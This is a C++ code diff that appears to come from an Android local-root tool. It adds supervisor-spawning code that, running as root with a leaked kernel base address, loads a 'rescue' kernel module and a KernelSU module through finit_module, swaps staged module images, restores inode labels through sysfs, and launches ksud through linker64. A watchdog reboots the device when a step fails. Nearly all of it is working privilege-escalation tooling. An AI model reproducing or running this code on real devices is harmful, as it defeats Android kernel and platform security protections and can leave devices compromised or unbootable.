+    char kernel_base_text[32];
+    int lengths[] {
+        std::snprintf(action_text, sizeof(action_text), "%d", action),
+        std::snprintf(manager_uid_text, sizeof(manager_uid_text),
+                      "%d", manager_uid),
+        std::snprintf(loader_fd_text, sizeof(loader_fd_text),
+                      "%d", loader_fd),
+        std::snprintf(module_fd_text, sizeof(module_fd_text),
+                      "%d", module_fd),
+        std::snprintf(action_fd_text, sizeof(action_fd_text),
+                      "%d", action_fd),
+        std::snprintf(kernel_base_text, sizeof(kernel_base_text),
+                      "%" PRIx64, kernel_base),
+    };
+    bool formatted = lengths[0] > 0 &&
+            lengths[0] < static_cast<int>(sizeof(action_text)) &&
+            lengths[1] > 0 &&
+            lengths[1] < static_cast<int>(sizeof(manager_uid_text)) &&
+            lengths[2] > 0 &&
+            lengths[2] < static_cast<int>(sizeof(loader_fd_text)) &&
+            lengths[3] > 0 &&
+            lengths[3] < static_cast<int>(sizeof(module_fd_text)) &&
+            lengths[4] > 0 &&
+            lengths[4] < static_cast<int>(sizeof(action_fd_text)) &&
+            lengths[5] > 0 &&
+            lengths[5] < static_cast<int>(sizeof(kernel_base_text));
+    if (!formatted) {
+        *spawn_error = EOVERFLOW;
+        return -1;
+    }
+
+    char supervisor_name[] = "prism-action-supervisor";
+    char supervisor_mode[] = "action-supervisor";
+    char* arguments[] {
+        supervisor_name,
+        supervisor_mode,
+        action_text,
+        manager_uid_text,
+        loader_fd_text,
+        module_fd_text,
+        action_fd_text,
+        kernel_base_text,
+        const_cast<char*>(completion_path),
+        nullptr,
+    };
+    char path_environment[] = "PATH=/system/bin:/system/xbin";
+    char* environment[] {path_environment, nullptr};
+    clone_args clone_arguments {};
+    clone_arguments.exit_signal = SIGCHLD;
+    errno = 0;
+    pid_t child = static_cast<pid_t>(syscall(
+            SYS_clone3, &clone_arguments, CLONE_ARGS_SIZE_VER0));
+    if (child == 0) {
+        struct sigaction ignored_pipe {};
+        ignored_pipe.sa_handler = SIG_IGN;
+        sigemptyset(&ignored_pipe.sa_mask);
+        if (sigaction(SIGPIPE, &ignored_pipe, nullptr) != 0) {
+            (void)syscall(SYS_exit, 64);
+            __builtin_unreachable();
+        }
+        (void)syscall(SYS_close, diagnostic_read_fd);
+        if (registration_read_fd != diagnostic_read_fd) {
+            (void)syscall(SYS_close, registration_read_fd);
+        }
+        pid_t self = static_cast<pid_t>(syscall(SYS_getpid));
+        ActionSupervisorReceipt receipt;
+        receipt.magic = kActionSupervisorReceiptMagic;
+        receipt.pid = self;
+        receipt.tid = static_cast<pid_t>(syscall(SYS_gettid));
+        receipt.action = action;
+        receipt.manager_uid = manager_uid;
+        receipt.kernel_base = kernel_base;
+        if (syscall(SYS_write, registration_write_fd, &receipt,
+                    sizeof(receipt)) !=
+                static_cast<long>(sizeof(receipt))) {
+            (void)syscall(SYS_exit, 127);
+            __builtin_unreachable();
+        }
+        if (diagnostic_write_fd != STDERR_FILENO &&
+                syscall(SYS_dup3, diagnostic_write_fd, STDERR_FILENO, 0) !=
+                        STDERR_FILENO) {
+            (void)syscall(SYS_exit, 127);
+            __builtin_unreachable();
+        }
+        (void)syscall(
+                SYS_execveat, supervisor_fd, "", arguments, environment,
+                AT_EMPTY_PATH);
+        (void)syscall(SYS_exit, 126);
+        __builtin_unreachable();
+    }
+    int clone_error = child < 0 ? errno : 0;
+    *spawn_error = clone_error;
+    return child;
+}
+
+pid_t spawn_resukisu_pidfd_supervisor(
+        int manager_uid, int module_fd, int action_fd,
+        std::uint64_t kernel_base,
+        int diagnostic_read_fd, int diagnostic_write_fd,
+        const char* completion_path, int* spawn_error) {
+    std::string rescue_parameters;
+    {
+        std::lock_guard<std::mutex> lock(g_ctlbuf_rescue_plan_mutex);
+        if (g_ctlbuf_rescue_plan_ready.load(std::memory_order_acquire) == 1) {
+            rescue_parameters = g_ctlbuf_rescue_parameters;
+        }
+    }
+    if (!rescue_parameters.empty()) {
+        rescue_parameters.append(" defer_inode_restore=1");
+    }
+    if (manager_uid < 10'000 || manager_uid >= 20'000 ||
+            module_fd < 0 || action_fd < 0 || diagnostic_read_fd < 0 ||
+            diagnostic_write_fd < 0 || completion_path == nullptr ||
+            spawn_error == nullptr || g_resukisu_replace == nullptr ||
+            g_resukisu_load == nullptr ||
+            g_resukisu_rescue_backup_fd < 0 ||
+            g_resukisu_rescue_image.size() !=
+                    static_cast<std::size_t>(kReSukiModuleSize) ||
+            g_resukisu_staged_image.size() !=
+                    static_cast<std::size_t>(kReSukiEmbeddedRescueSize) ||
+            rescue_parameters.empty()) {
+        if (spawn_error != nullptr) {
+            *spawn_error = EINVAL;
+        }
+        return -1;
+    }
+    char manager_uid_text[16];
+    char action_path[64];
+    int lengths[] {
+        std::snprintf(manager_uid_text, sizeof(manager_uid_text),
+                      "%d", manager_uid),
+        std::snprintf(action_path, sizeof(action_path),
+                      "/proc/self/fd/%d", action_fd),
+    };
+    bool formatted = lengths[0] > 0 &&
+            lengths[0] < static_cast<int>(sizeof(manager_uid_text)) &&
+            lengths[1] > 0 &&
+            lengths[1] < static_cast<int>(sizeof(action_path));
+    if (!formatted) {
+        *spawn_error = EOVERFLOW;
+        return -1;
+    }
+    char linker_name[] = "linker64";
+    char late_load[] = "late-load";
+    char kmi_option[] = "--kmi";
+    char kmi[] = "android12-5.10";
+    char package_option[] = "--package-name";
+    char package[] = "com.resukisu.resukisu";
+    char manager_option[] = "--foreground-manager-uid";
+    char completion_option[] = "--lp3-completion-path";
+    char* arguments[] {
+        linker_name, action_path, late_load, kmi_option, kmi,
+        package_option, package, manager_option, manager_uid_text,
+        completion_option, const_cast<char*>(completion_path), nullptr,
+    };
+    char path_environment[] = "PATH=/system/bin:/system/xbin";
+    char* environment[] {path_environment, nullptr};
+    __atomic_store_n(&g_resukisu_raw_pidfd, -1, __ATOMIC_RELEASE);
+    clone_args clone_arguments {};
+    clone_arguments.flags = CLONE_PIDFD;
+    clone_arguments.pidfd = reinterpret_cast<std::uint64_t>(
+            &g_resukisu_raw_pidfd);
+    clone_arguments.exit_signal = SIGCHLD;
+    errno = 0;
+    pid_t child = static_cast<pid_t>(syscall(
+            SYS_clone3, &clone_arguments, CLONE_ARGS_SIZE_VER0));
+    if (child == 0) {
+        int phase_fd = open(
+                "/data/local/tmp/lp3-action-phase",
+                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC | O_NOFOLLOW,
+                0600);
+        auto record_phase = [&](const char* stage, int result, int error) {
+            timespec now {};
+            (void)clock_gettime(CLOCK_MONOTONIC, &now);
+            char line[160];
+            int length = std::snprintf(
+                    line, sizeof(line),
+                    "LP3_ACTION_PHASE elapsed_ns=%lld stage=%s result=%d errno=%d\n",
+                    static_cast<long long>(now.tv_sec) * 1000000000LL +
+                            now.tv_nsec,
+                    stage, result, error);
+            if (length > 0 && length < static_cast<int>(sizeof(line))) {
+                if (phase_fd >= 0) {
+                    (void)syscall(SYS_write, phase_fd, line, length);
+                }
+                (void)syscall(SYS_write, STDERR_FILENO, line, length);
+                int completion_phase_fd =
+                        g_resukisu_completion_fd.load(
+                                std::memory_order_relaxed);
+                if (completion_phase_fd >= 0) {
+                    std::size_t phase_length = std::min<std::size_t>(
+                            static_cast<std::size_t>(length), 47);
+                    (void)pwrite(
+                            completion_phase_fd, line, phase_length, 16);
+                }
+            }
+        };
+        record_phase("child-enter", 0, 0);
+        struct sigaction ignored_pipe {};
+        ignored_pipe.sa_handler = SIG_IGN;
+        sigemptyset(&ignored_pipe.sa_mask);
+        if (sigaction(SIGPIPE, &ignored_pipe, nullptr) != 0) {
+            (void)syscall(SYS_exit, 64);
+            __builtin_unreachable();
+        }
+        (void)syscall(SYS_close, diagnostic_read_fd);
+        if (diagnostic_write_fd != STDERR_FILENO &&
+                syscall(SYS_dup3, diagnostic_write_fd,
+                        STDERR_FILENO, 0) != STDERR_FILENO) {
+            (void)syscall(SYS_exit, 127);
+            __builtin_unreachable();
+        }
+        int rescue_replace_result = g_resukisu_replace(
+                g_resukisu_rescue_image.data(),
+                g_resukisu_rescue_image.size());
+        record_phase("rescue-replace", rescue_replace_result, 0);
+        if (rescue_replace_result != 0) {
+            static constexpr char kRestoreError[] =
+                    "LP3_RESCUE_PRELOAD_RESTORE_ERROR\n";
+            (void)syscall(SYS_write, STDERR_FILENO, kRestoreError,
+                          sizeof(kRestoreError) - 1);
+            (void)syscall(SYS_exit, 60);
+            __builtin_unreachable();
+        }
+        char rescue_path[64];
+        int rescue_path_length = std::snprintf(
+                rescue_path, sizeof(rescue_path),
+                "/proc/self/fd/%d", module_fd);
+        errno = 0;
+        int rescue_fd = rescue_path_length > 0 &&
+                rescue_path_length < static_cast<int>(sizeof(rescue_path))
+                ? open(rescue_path, O_RDONLY | O_CLOEXEC) : -1;
+        int rescue_open_error = rescue_fd >= 0 ? 0 :
+                (errno == 0 ? EOVERFLOW : errno);
+        struct stat source_stat {};
+        struct stat rescue_stat {};
+        bool rescue_descriptor_valid = rescue_fd >= 0 &&
+                fstat(module_fd, &source_stat) == 0 &&
+                fstat(rescue_fd, &rescue_stat) == 0 &&
+                S_ISREG(source_stat.st_mode) &&
+                source_stat.st_dev == rescue_stat.st_dev &&
+                source_stat.st_ino == rescue_stat.st_ino &&
+                source_stat.st_size == kReSukiEmbeddedRescueSize &&
+                source_stat.st_size == rescue_stat.st_size &&
+                source_stat.st_mode == rescue_stat.st_mode;
+        if (!rescue_descriptor_valid) {
+            char diagnostic[128];
+            int length = std::snprintf(
+                    diagnostic, sizeof(diagnostic),
+                    "LP3_RESCUE_REOPEN_ERROR errno=%d valid=%d\n",
+                    rescue_open_error, rescue_fd >= 0 ? 1 : 0);
+            if (length > 0 && length < static_cast<int>(sizeof(diagnostic))) {
+                (void)syscall(SYS_write, STDERR_FILENO, diagnostic, length);
+            }
+            if (rescue_fd >= 0) {
+                (void)close(rescue_fd);
+            }
+            (void)syscall(SYS_exit, 65);
+            __builtin_unreachable();
+        }
+        std::uint8_t rescue_magic = 0;
+        errno = 0;
+        ssize_t rescue_read = pread(
+                rescue_fd, &rescue_magic, sizeof(rescue_magic), 0);
+        int rescue_read_error = rescue_read ==
+                static_cast<ssize_t>(sizeof(rescue_magic)) ? 0 : errno;
+        if (rescue_read != static_cast<ssize_t>(sizeof(rescue_magic)) ||
+                rescue_magic != ELFMAG0) {
+            char diagnostic[128];
+            int length = std::snprintf(
+                    diagnostic, sizeof(diagnostic),
+                    "LP3_RESCUE_READ_ERROR result=%zd errno=%d magic=0x%x\n",
+                    rescue_read, rescue_read_error, rescue_magic);
+            if (length > 0 && length < static_cast<int>(sizeof(diagnostic))) {
+                (void)syscall(SYS_write, STDERR_FILENO, diagnostic, length);
+            }
+            (void)close(rescue_fd);
+            (void)syscall(SYS_exit,
+                    rescue_read_error == EACCES ? 67 :
+                    (rescue_read_error != 0 ? 68 : 69));
+            __builtin_unreachable();
+        }
+        errno = 0;
+        int rescue_result = static_cast<int>(syscall(
+                SYS_finit_module, rescue_fd,
+                rescue_parameters.c_str(), 0));
+        int rescue_error = rescue_result == 0 ? 0 : errno;
+        (void)close(rescue_fd);
+        record_phase("rescue-init", rescue_result, rescue_error);
+        if (rescue_result != 0) {
+            char diagnostic[96];
+            int length = std::snprintf(
+                    diagnostic, sizeof(diagnostic),
+                    "LP3_RESCUE_PRELOAD_ERROR errno=%d\n", rescue_error);
+            if (length > 0 && length < static_cast<int>(sizeof(diagnostic))) {
+                (void)syscall(SYS_write, STDERR_FILENO, diagnostic, length);
+            }
+            int diagnostic_exit = rescue_error;
+            if (rescue_error == EACCES) {
+                diagnostic_exit = 70;
+            } else if (rescue_error == ENOKEY) {
+                diagnostic_exit = 73;
+            }
+            (void)syscall(SYS_exit,
+                          diagnostic_exit > 0 && diagnostic_exit < 126
+                                  ? diagnostic_exit : 61);
+            __builtin_unreachable();
+        }
+        static constexpr char kRescuePass[] =
+                "LP3_RESCUE_PRELOAD_PASS\n";
+        (void)syscall(SYS_write, STDERR_FILENO, kRescuePass,
+                      sizeof(kRescuePass) - 1);
+        int stage_replace_result = g_resukisu_replace(
+                g_resukisu_staged_image.data(),
+                g_resukisu_staged_image.size());
+        record_phase("kernelsu-replace", stage_replace_result, 0);
+        if (stage_replace_result != 0) {
+            static constexpr char kStageError[] =
+                    "LP3_RESUKISU_RESTAGE_ERROR\n";
+            (void)syscall(SYS_write, STDERR_FILENO, kStageError,
+                          sizeof(kStageError) - 1);
+            (void)syscall(SYS_exit, 62);
+            __builtin_unreachable();
+        }
+        errno = 0;
+        int kernelsu_fd = open(rescue_path, O_RDONLY | O_CLOEXEC);
+        int kernelsu_open_error = kernelsu_fd >= 0 ? 0 : errno;
+        struct stat kernelsu_stat {};
+        bool kernelsu_descriptor_valid = kernelsu_fd >= 0 &&
+                fstat(module_fd, &source_stat) == 0 &&
+                fstat(kernelsu_fd, &kernelsu_stat) == 0 &&
+                S_ISREG(kernelsu_stat.st_mode) &&
+                source_stat.st_dev == kernelsu_stat.st_dev &&
+                source_stat.st_ino == kernelsu_stat.st_ino &&
+                source_stat.st_size == kReSukiEmbeddedRescueSize &&
+                source_stat.st_size == kernelsu_stat.st_size &&
+                source_stat.st_mode == kernelsu_stat.st_mode;
+        if (!kernelsu_descriptor_valid) {
+            char diagnostic[128];
+            int length = std::snprintf(
+                    diagnostic, sizeof(diagnostic),
+                    "LP3_KERNELSU_REOPEN_ERROR errno=%d valid=%d\n",
+                    kernelsu_open_error, kernelsu_fd >= 0 ? 1 : 0);
+            if (length > 0 && length < static_cast<int>(sizeof(diagnostic))) {
+                (void)syscall(SYS_write, STDERR_FILENO, diagnostic, length);
+            }
+            if (kernelsu_fd >= 0) {
+                (void)close(kernelsu_fd);
+            }
+            (void)syscall(SYS_exit, 77);
+            __builtin_unreachable();
+        }
+        std::uint8_t kernelsu_magic = 0;
+        errno = 0;
+        ssize_t kernelsu_read = pread(
+                kernelsu_fd, &kernelsu_magic, sizeof(kernelsu_magic), 0);
+        if (kernelsu_read != static_cast<ssize_t>(sizeof(kernelsu_magic)) ||
+                kernelsu_magic != ELFMAG0) {
+            (void)close(kernelsu_fd);
+            (void)syscall(SYS_exit, 78);
+            __builtin_unreachable();
+        }
+        char kernelsu_parameters[48];
+        int kernelsu_parameter_length = std::snprintf(
+                kernelsu_parameters, sizeof(kernelsu_parameters),
+                "lp3_manager_uid=%d", manager_uid);
+        if (kernelsu_parameter_length <= 0 ||
+                kernelsu_parameter_length >=
+                        static_cast<int>(sizeof(kernelsu_parameters))) {
+            (void)close(kernelsu_fd);
+            (void)syscall(SYS_exit, 85);
+            __builtin_unreachable();
+        }
+        errno = 0;
+        int kernelsu_result = static_cast<int>(syscall(
+                SYS_finit_module, kernelsu_fd, kernelsu_parameters, 0));
+        int kernelsu_error = kernelsu_result == 0 ? 0 : errno;
+        (void)close(kernelsu_fd);
+        record_phase("kernelsu-init", kernelsu_result, kernelsu_error);
+        if (kernelsu_result != 0) {
+            char diagnostic[96];
+            int length = std::snprintf(
+                    diagnostic, sizeof(diagnostic),
+                    "LP3_KERNELSU_PRELOAD_ERROR errno=%d\n", kernelsu_error);
+            if (length > 0 && length < static_cast<int>(sizeof(diagnostic))) {
+                (void)syscall(SYS_write, STDERR_FILENO, diagnostic, length);
+            }
+            int diagnostic_exit = kernelsu_error == EACCES ? 80 :
+                    (kernelsu_error == ENOKEY ? 81 :
+                     (kernelsu_error == EPERM ? 82 :
+                      (kernelsu_error == ENOEXEC ? 83 : 84)));
+            (void)syscall(SYS_exit, diagnostic_exit);
+            __builtin_unreachable();
+        }
+        int load_result = g_resukisu_load(
+                static_cast<std::uint32_t>(manager_uid), STDERR_FILENO,
+                module_fd, kernel_base);
+        record_phase("kernelsu-load", load_result,
+                     load_result == 0 ? 0 : errno);
+        if (load_result != 0) {
+            (void)syscall(SYS_exit,
+                          load_result == 13 ? 76 :
+                          (load_result > 0 && load_result < 126
+                                  ? load_result : 125));
+            __builtin_unreachable();
+        }
+        int restore_fd = open(
+                "/sys/module/lp3_ctlbuf_rescue/parameters/"
+                "inode_restore_request", O_WRONLY | O_CLOEXEC);
+        static constexpr char kRestoreRequest[] = "1";
+        bool inode_restored = restore_fd >= 0 &&
+                write(restore_fd, kRestoreRequest,
+                      sizeof(kRestoreRequest) - 1) ==
+                        static_cast<ssize_t>(sizeof(kRestoreRequest) - 1) &&
+                close(restore_fd) == 0;
+        if (!inode_restored) {
+            if (restore_fd >= 0) {
+                (void)close(restore_fd);
+            }
+            static constexpr char kLabelError[] =
+                    "LP3_RESCUE_INODE_RESTORE_ERROR\n";
+            (void)syscall(SYS_write, STDERR_FILENO, kLabelError,
+                          sizeof(kLabelError) - 1);
+            (void)syscall(SYS_exit, 63);
+            __builtin_unreachable();
+        }
+        static constexpr char kLabelPass[] =
+                "LP3_RESCUE_INODE_RESTORE_PASS\n";
+        (void)syscall(SYS_write, STDERR_FILENO, kLabelPass,
+                      sizeof(kLabelPass) - 1);
+        record_phase("action-exec", 0, 0);
+        (void)syscall(SYS_execve, "/system/bin/linker64", arguments,
+                      environment);
+        int exec_error = errno;
+        (void)syscall(SYS_exit,
+                      exec_error > 0 && exec_error < 126
+                              ? exec_error : 125);
+        __builtin_unreachable();
+    }
+    *spawn_error = child < 0 ? errno : 0;
+    return child;
+}
+
+[[maybe_unused]] void* action_daemon_spawner_thread(void*) {
+    CommandRootIdentity identity;
+    if (!read_command_root_identity(&identity) ||
+            identity.pid != identity.tid ||
+            !command_identity_is_root(identity) ||
+            g_action_daemon_parent_fd < 0 ||
+            g_action_daemon_child_fd < 0) {
+        g_action_daemon_spawn_stage.store(-1, std::memory_order_release);
+        return nullptr;
+    }
+    int supervisor_fd = g_action_supervisor_source_fd;
+    struct stat supervisor_stat {};
+    errno = 0;
+    int supervisor_stat_result = supervisor_fd >= 0
+            ? fstat(supervisor_fd, &supervisor_stat) : -1;
+    bool supervisor_valid = supervisor_stat_result == 0 &&
+            S_ISREG(supervisor_stat.st_mode) &&
+            supervisor_stat.st_uid == 2000 &&
+            supervisor_stat.st_gid == 2000 &&
+            (supervisor_stat.st_mode & 0777) == 0755;
+    if (!supervisor_valid) {
+        int detail = supervisor_stat_result != 0
+                ? (errno == 0 ? EBADF : errno)
+                : (100'000 + static_cast<int>(
+                        supervisor_stat.st_mode & 0777) +
+                   (supervisor_stat.st_uid == 2000 ? 0 : 10'000) +
+                   (supervisor_stat.st_gid == 2000 ? 0 : 20'000) +
+                   (S_ISREG(supervisor_stat.st_mode) ? 0 : 40'000));
+        g_resukisu_spawn_error.store(detail, std::memory_order_release);
+        g_action_daemon_spawn_stage.store(-2, std::memory_order_release);
+        return nullptr;
+    }
+    char socket_text[16];
+    int socket_length = std::snprintf(
+            socket_text, sizeof(socket_text), "%d", g_action_daemon_child_fd);
+    if (socket_length <= 0 ||
+            socket_length >= static_cast<int>(sizeof(socket_text))) {
+        g_action_daemon_spawn_stage.store(-3, std::memory_order_release);
+        return nullptr;
+    }
+    char name[] = "prism-action-daemon";
+    char mode[] = "action-daemon";
+    char* arguments[] {name, mode, socket_text, nullptr};
+    char path_environment[] = "PATH=/system/bin:/system/xbin";
+    char* environment[] {path_environment, nullptr};
+    char supervisor_path[64];
+    int supervisor_path_length = std::snprintf(
+            supervisor_path, sizeof(supervisor_path),
+            "/proc/self/fd/%d", supervisor_fd);
+    int descriptor_flags = fcntl(supervisor_fd, F_GETFD);
+    bool spawn_ready = supervisor_path_length > 0 &&
+            supervisor_path_length <
+                    static_cast<int>(sizeof(supervisor_path)) &&
+            descriptor_flags >= 0 &&
+            fcntl(supervisor_fd, F_SETFD,
+                  descriptor_flags & ~FD_CLOEXEC) == 0;
+    g_action_daemon_spawn_stage.store(2, std::memory_order_release);
+    pid_t child = -1;
+    int spawn_error = spawn_ready
+            ? posix_spawn(
+                    &child, supervisor_path, nullptr, nullptr,
+                    arguments, environment)
+            : (errno == 0 ? EINVAL : errno);
+    if (descriptor_flags >= 0) {
+        (void)fcntl(supervisor_fd, F_SETFD, descriptor_flags);
+    }
+    if (spawn_error != 0) {
+        child = -1;
+    }
+    if (g_action_daemon_child_fd >= 0) {
+        close(g_action_daemon_child_fd);
+        g_action_daemon_child_fd = -1;
+    }
+    g_resukisu_spawn_error.store(spawn_error, std::memory_order_release);
+    g_action_daemon_spawn_stage.store(
+            child > 0 ? 3 : -4, std::memory_order_release);
+    return nullptr;
+}
+
 void* command_root_watchdog_thread(void*) {
     CommandRootIdentity identity;
     bool valid = read_command_root_identity(&identity) &&
             identity.tid != identity.pid &&
-            same_command_root_identity(
-                    g_command_watchdog_leader_identity, identity);
+            command_identity_is_root(identity) &&
+            g_command_watchdog_leader_identity.pid == identity.pid &&
+            g_command_watchdog_leader_identity.tid == identity.pid &&
+            command_identity_has_root_ids(
+                    g_command_watchdog_leader_identity);
+    if (valid) {
+        g_command_watchdog_leader_identity = identity;
+    }
     g_command_watchdog_identity = identity;
     g_command_watchdog_tid.store(identity.tid, std::memory_order_release);
     if (!valid) {
@@ -4959,6 +7099,15 @@ void* command_root_watchdog_thread(void*) {
         g_command_watchdog_ready.store(-1, std::memory_order_release);
         wake_command_watchdog(&g_command_watchdog_ready, INT_MAX);
         write_command_watchdog_invalid("child-identity");
+        command_watchdog_reboot_forever();
+    }
+
+    if (g_action_daemon_spawn_stage.load(std::memory_order_acquire) != 3) {
+        g_command_watchdog_phase.store(
+                kCommandWatchdogFailed, std::memory_order_release);
+        g_command_watchdog_ready.store(-1, std::memory_order_release);
+        wake_command_watchdog(&g_command_watchdog_ready, INT_MAX);
+        write_command_watchdog_invalid("action-daemon-spawn");
         command_watchdog_reboot_forever();
     }
 
@@ -4975,118 +7124,247 @@ void* command_root_watchdog_thread(void*) {
             static_cast<std::int64_t>(started.tv_sec + 180) *
                     1000000000LL + started.tv_nsec;
     for (;;) {
+        g_command_watchdog_heartbeat.fetch_add(
+                1, std::memory_order_relaxed);
         if (g_command_watchdog_exit.load(std::memory_order_acquire) == 1) {
             break;
         }
         int action = g_resukisu_action.load(std::memory_order_acquire);
-        if (action == 1 || action == 2) {
+        int loader_request = g_action_loader_request.load(
+                std::memory_order_acquire);
+        if (action == 2 && loader_request == 1) {
+            CommandRootIdentity loader_identity;
+            bool loader_identity_valid =
+                    read_command_root_identity(&loader_identity) &&
+                    loader_identity.pid == identity.pid &&
+                    loader_identity.tid == identity.tid &&
+                    command_identity_is_root(loader_identity);
+            std::uint64_t kernel_base = g_resukisu_kernel_base.load(
+                    std::memory_order_acquire);
+            int module_fd = g_resukisu_module_fd;
+            int manager_uid = g_resukisu_manager_uid.load(
+                    std::memory_order_acquire);
+            int loader_gate =
+                    (loader_identity_valid ? 1 : 0) |
+                    (kernel_address(kernel_base) ? 2 : 0) |
+                    (module_fd >= 0 ? 4 : 0) |
+                    (manager_uid >= 10'000 && manager_uid < 20'000 ? 8 : 0) |
+                    (g_action_resukisu_library != nullptr ? 16 : 0) |
+                    (g_action_resukisu_probe != nullptr ? 32 : 0) |
+                    (g_action_resukisu_relocate_probe != nullptr ? 64 : 0) |
+                    (g_action_resukisu_stage != nullptr ? 128 : 0) |
+                    (g_action_resukisu_load != nullptr ? 256 : 0) |
+                    (g_action_daemon_child_fd >= 0 ? 512 : 0) |
+                    (g_action_resukisu_probe != nullptr &&
+                            g_action_resukisu_probe() ==
+                                    UINT32_C(0x4c503352) ? 1024 : 0);
+            bool loader_valid = loader_gate == 2047;
+            int relocation_result = loader_valid
+                    ? 0 : -10'000 - loader_gate;
+            int stage_result = loader_valid ? 0 : -1;
+            char completion_path[160];
+            std::snprintf(
+                    completion_path, sizeof(completion_path),
+                    "/data/local/tmp/lp3-ksud-completion.%s",
+                    g_command_watchdog_nonce);
+            int spawn_error = 0;
+            g_resukisu_spawn_stage.store(2, std::memory_order_release);
+            pid_t child = loader_valid
+                    ? spawn_resukisu_pidfd_supervisor(
+                            manager_uid, module_fd, g_resukisu_fd,
+                            kernel_base,
+                            g_action_daemon_parent_fd,
+                            g_action_daemon_child_fd,
+                            completion_path, &spawn_error)
+                    : -1;
+            int load_result = loader_valid && child >= 0 ? 0 : -1;
+            g_resukisu_spawn_error.store(
+                    spawn_error, std::memory_order_release);
+            g_resukisu_spawn_stage.store(
+                    child > 0 ? 3 : (child == 0 ? 2 : -1),
+                    std::memory_order_release);
+            if (child > 0) {
+                g_resukisu_child_pid.store(
+                        child, std::memory_order_release);
+            }
+            g_action_loader_gate.store(
+                    loader_gate, std::memory_order_relaxed);
+            g_action_loader_relocation.store(
+                    relocation_result, std::memory_order_relaxed);
+            g_action_loader_stage.store(
+                    stage_result, std::memory_order_relaxed);
+            g_action_loader_result.store(
+                    load_result, std::memory_order_relaxed);
+            g_action_loader_request.store(2, std::memory_order_release);
+            wake_command_watchdog(&g_action_loader_request, INT_MAX);
+        }
+        if ((action == 1 || action == 2) &&
+                g_action_daemon_spawn_stage.load(
+                        std::memory_order_acquire) == 0) {
+            g_resukisu_spawn_stage.store(1, std::memory_order_release);
             int manager_uid = g_resukisu_manager_uid.load(
                     std::memory_order_acquire);
             int action_fd = g_resukisu_fd;
             int module_fd = g_resukisu_module_fd;
-            int diagnostic_pipe[2] {-1, -1};
-            errno = 0;
-            int pipe_result = pipe2(diagnostic_pipe, O_CLOEXEC);
-            int pipe_error = pipe_result == 0 ? 0 : errno;
-            errno = 0;
-            pid_t child = pipe_result == 0 ? fork() : -1;
-            if (child == 0) {
-                close(diagnostic_pipe[0]);
-                if (g_resukisu_probe == nullptr ||
-                    g_resukisu_load == nullptr) {
-                    _exit(125);
-                }
-                if (action == 1) {
-                    _exit(g_resukisu_probe() == UINT32_C(0x4c503352)
-                            ? 0 : 124);
-                }
-                int load_result = g_resukisu_load(
-                        static_cast<std::uint32_t>(manager_uid),
-                        diagnostic_pipe[1], module_fd,
-                        g_resukisu_kernel_base.load(
-                                std::memory_order_acquire));
-                if (load_result != 0) {
-                    _exit(100 + std::min(load_result, 120));
-                }
-                char uid[16];
-                std::snprintf(uid, sizeof(uid), "%d", manager_uid);
-                constexpr char kReSukiExecutable[] =
-                        "/data/local/tmp/lp3-resukisu-ksud";
-                struct stat descriptor_stat {};
-                struct stat path_stat {};
-                errno = 0;
-                if (fstat(action_fd, &descriptor_stat) != 0 ||
-                        stat(kReSukiExecutable, &path_stat) != 0 ||
-                        descriptor_stat.st_dev != path_stat.st_dev ||
-                        descriptor_stat.st_ino != path_stat.st_ino ||
-                        descriptor_stat.st_size != path_stat.st_size ||
-                        descriptor_stat.st_uid != path_stat.st_uid ||
-                        descriptor_stat.st_gid != path_stat.st_gid ||
-                        descriptor_stat.st_mode != path_stat.st_mode) {
-                    int duplicate_error = errno == 0 ? ESTALE : errno;
-                    char diagnostic[128];
-                    int diagnostic_length = std::snprintf(
-                            diagnostic, sizeof(diagnostic),
-                            "LP3_RESUKISU_EXEC_PATH_ERROR errno=%d"
-                            " action_fd=%d\n",
-                            duplicate_error, action_fd);
-                    if (diagnostic_length > 0 &&
-                            diagnostic_length <
-                                    static_cast<int>(sizeof(diagnostic))) {
-                        (void)write_all(
-                                diagnostic_pipe[1], diagnostic,
-                                static_cast<std::size_t>(diagnostic_length));
-                    }
-                    _exit(127);
-                }
-                if (dup2(diagnostic_pipe[1], STDERR_FILENO) !=
-                        STDERR_FILENO) {
-                    _exit(127);
-                }
-                execl("/system/bin/linker64", "linker64",
-                      kReSukiExecutable, "late-load",
-                      "--kmi", "android12-5.10",
-                      "--package-name", "com.resukisu.resukisu",
-                      "--foreground-manager-uid", uid,
-                      static_cast<char*>(nullptr));
-                int exec_error = errno;
-                char diagnostic[192];
-                int diagnostic_length = std::snprintf(
-                        diagnostic, sizeof(diagnostic),
-                        "LP3_RESUKISU_EXEC_ERROR errno=%d action_fd=%d"
-                        " executable=%s\n",
-                        exec_error, action_fd, kReSukiExecutable);
-                if (diagnostic_length > 0 &&
-                        diagnostic_length <
-                                static_cast<int>(sizeof(diagnostic))) {
-                    (void)write_all(
-                            diagnostic_pipe[1], diagnostic,
-                            static_cast<std::size_t>(diagnostic_length));
-                }
-                _exit(126);
+            int registration_read_fd =
+                    g_resukisu_registration_read_fd.load(
+                            std::memory_order_acquire);
+            int registration_write_fd =
+                    g_resukisu_registration_write_fd.load(
+                            std::memory_order_acquire);
+            char completion_path[160];
+            std::snprintf(
+                    completion_path, sizeof(completion_path),
+                    "/data/local/tmp/lp3-ksud-completion.%s",
+                    g_command_watchdog_nonce);
+            int completion_fd = g_resukisu_completion_fd.load(
+                    std::memory_order_acquire);
+            int pipe_error = completion_fd < 0
+                    ? EPROTO :
+                    ((registration_read_fd < 0 ||
+                      registration_write_fd < 0) ? EPROTO : 0);
+            int diagnostic_read_fd = registration_read_fd;
+            int diagnostic_write_fd = registration_write_fd;
+            int diagnostic_pipe[2] {diagnostic_read_fd, -1};
+            if (pipe_error == 0) {
+                g_resukisu_diagnostic_fd.store(
+                        diagnostic_read_fd, std::memory_order_release);
             }
+            int supervisor_error = 0;
+            g_resukisu_spawn_stage.store(2, std::memory_order_release);
+            pid_t child = pipe_error == 0
+                    ? spawn_resukisu_supervisor(
+                            action, manager_uid, g_action_supervisor_fd,
+                            g_resukisu_loader_fd,
+                            module_fd, action_fd,
+                            g_resukisu_kernel_base.load(
+                                    std::memory_order_acquire),
+                            completion_path, diagnostic_read_fd,
+                            diagnostic_write_fd,
+                            registration_read_fd,
+                            registration_write_fd,
+                            &supervisor_error)
+                    : -1;
+            g_resukisu_spawn_stage.store(
+                    child > 0 ? 3 : -1, std::memory_order_release);
             int fork_error = pipe_error != 0
-                    ? pipe_error : (child < 0 ? errno : 0);
-            if (diagnostic_pipe[1] >= 0) {
-                close(diagnostic_pipe[1]);
-                diagnostic_pipe[1] = -1;
